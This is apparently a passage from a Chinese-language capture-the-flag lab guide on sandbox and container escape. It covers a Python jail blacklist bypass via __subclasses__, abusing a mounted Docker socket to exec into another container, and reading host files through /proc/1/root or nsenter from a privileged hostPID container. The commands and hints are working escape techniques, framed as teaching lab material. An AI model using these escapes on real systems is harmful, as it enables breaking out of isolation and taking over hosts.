黑名单挡的是 __class__ 这个字符串， 但你完全可以写 '_' + '_class_' + '_' 拼出来。 拼出来之后，用哪个「没被拉黑」的内置函数把它当属性名取出来？ 然后：tuple → __bases__ → object → __subclasses__， 在那一长串子类里找一个 __init__.__globals__ 里有 system 的类。

L5

Docker Socket —— 挂进来的 socket 就是宿主的门

container · /var/run/docker.sock
目标 /flag_l5（在 sbox-vault 里）

sbox-sock 是个「CI Runner」容器，为了跑自动部署，把宿主机的 /var/run/docker.sock 挂了进来。同网络里还有个 sbox-vault：没开端口、没给 shell，只放了一个 /flag_l5。
现在，从 runner 里把那个 flag 拿出来。 

# 入口：拿到 runner 里的 shell
docker exec -it sbox-sock bash

# 你手上有 docker CLI，也有 curl + python3
docker ps
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
提示（卡住再看）

能连上 socket，就等于拿到了 root@宿主机 —— 起容器、进容器、 挂宿主机目录，全都不用密码。最简单的验证：直接对 vault 下一条 exec 指令。想理解原理就别用 CLI，用 POST /containers/{id}/exec + POST /exec/{id}/start 自己拼一遍。

L6

privileged + hostPID —— 共享命名空间就没有边界

container · --privileged --pid=host
目标 /lab-escape/l6.flag（宿主根目录）

sbox-priv 的启动参数是运维为了「方便排障」加上的： privileged: true + pid: host。 flag 被放在宿主根文件系统的 /lab-escape/l6.flag， 容器自己的 / 里没有这个文件。
在容器里看到的是宿主的 PID 命名空间 —— 那 /proc/1/root 是什么？ 

# 入口：进特权容器
docker exec -it sbox-priv bash

# 先确认自己在哪：/proc 里应该是宿主那 300 多个进程
ls /proc | grep -E '^[0-9]+$' | wc -l
cat /proc/1/cmdline; echo   # /initd —— Docker Desktop 的 VM init，不是你的容器

ls /lab-escape 2>&1         # 没有 —— 不在容器的 rootfs 里
cat /proc/1/root/lab-escape/l6.flag
提示（卡住再看）

--pid=host 让容器看见宿主的进程表，--privileged 给了足够的 capability 去穿过 /proc。 于是 /proc/1/root 就是宿主 PID 1 的根目录。 等价的另一条路是用 nsenter -t 1 -m -u -i -n -p 直接进宿主的各个命名空间。
macOS / Windows 上你逃到的是 Docker Desktop 的 Linux VM，不是 macOS 本身 —— 这恰恰说明容器不是虚拟机。
